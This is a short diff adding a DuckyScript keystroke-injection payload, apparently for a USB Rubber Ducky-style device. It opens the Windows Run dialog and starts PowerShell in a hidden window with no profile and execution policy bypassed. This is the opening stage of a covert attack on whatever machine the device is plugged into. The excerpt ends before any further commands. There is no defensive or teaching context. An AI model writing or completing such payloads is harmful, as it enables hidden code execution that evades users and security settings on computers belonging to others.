@@ -1,0 +1,5 @@
+GUI r
+DELAY 100
+STRING powershell -NoP -W Hidden -EP Bypass
+ENTER
+DELAY 500
